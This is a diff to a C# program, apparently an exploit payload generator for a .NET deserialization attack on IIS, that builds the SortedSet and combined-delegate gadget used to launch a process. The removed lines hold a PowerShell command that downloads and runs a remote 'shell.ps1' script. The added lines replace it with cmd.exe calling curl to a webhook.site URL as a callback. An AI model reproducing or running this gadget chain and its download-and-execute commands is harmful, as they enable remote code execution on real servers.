@@ -16,8 +16,8 @@ namespace hawktraceiis
             Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
             IComparer<string> comp = Comparer<string>.Create(d);
             SortedSet<string> set = new SortedSet<string>(comp);
-            set.Add("powershell.exe");
-            set.Add("-Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.102:8081/shell.ps1')\"");
+            set.Add("cmd.exe");
+            set.Add("/c curl https://webhook.site/eaa3f8ef-246b-4ca5-8b17-4a7a9d3c2527");
 
             FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
             object[] invoke_list = d.GetInvocationList();
@@ -42,5 +42,6 @@ namespace hawktraceiis
     }
 
 }
+
 
 
